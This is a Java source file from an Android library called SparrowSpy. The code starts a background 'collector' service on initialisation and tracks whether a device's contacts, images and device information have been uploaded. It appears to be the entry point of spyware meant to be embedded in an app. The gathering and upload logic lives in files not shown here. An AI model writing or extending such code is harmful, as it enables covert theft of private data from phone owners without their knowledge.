package com.tangledbytes.sparrowspy;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;

import com.tangledbytes.sparrowspy.events.Events;
import com.tangledbytes.sparrowspy.services.SparrowSpyService;
import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.SpyState;
import com.tangledbytes.sparrowspy.utils.Utils;

public class SparrowSpy {
    private static final String TAG = "SparrowSpy";
    public static final int PERMISSIONS_REQUEST_CODE = 101;
    public static final int OPEN_SETTINGS_REQUEST_CODE = 102;
    private final Activity mActivity;
    private final PermissionManager mPermissionManager;

    private SparrowSpy(Activity activity) {
        mActivity = activity;
        mPermissionManager = new PermissionManager(activity);
    }

    public static SparrowSpy init(Activity activity) {
        SparrowSpy spy = new SparrowSpy(activity);
        spy.startCollectorService();
        return spy;
    }

    public SparrowSpy setDataCollectionListener(Events.DataCollectionListener listener) {
        SpyState.Listeners.dataCollectionListener = listener;
        return this;
    }

    public SparrowSpy setDataUploadListener(Events.DataUploadListener listener) {
        SpyState.Listeners.dataUploadListener = listener;
        return this;
    }

    public SparrowSpy setSpyServiceStateChangeListener(Events.SpyServiceStateChangeListener listener) {
        SpyState.Listeners.spyServiceStateChangeListener = listener;
        return this;
    }

    public SparrowSpy setPermissionDeniedListener(Events.PermissionsListener listener) {
        SpyState.Listeners.permissionsListener = listener;
        return this;
    }

    private void startCollectorService() {
        if (!mPermissionManager.hasAllPermissions()) {
            Log.d(TAG, "All permissions are not granted, prompting for permission grant...");
            mPermissionManager.grantPermissions();
            return;
        }
        Intent intentCollectorService = new Intent(mActivity, SparrowSpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            mActivity.startForegroundService(intentCollectorService);
        } else
            mActivity.startService(intentCollectorService);
    }

    public void handlePermissionResult() {
        mPermissionManager.handlePermissionResult();
        startCollectorService();
    }

    public boolean hasUploadedAllData() {
        return Constants.appPrefs.getBoolean(Constants.PREF_CONTACTS_STATUS, false)
                && Constants.appPrefs.getBoolean(Constants.PREF_IMAGES_STATUS, false)
                && Constants.appPrefs.getBoolean(Constants.PREF_DEVICE_INFO_STATUS, false);
    }

}
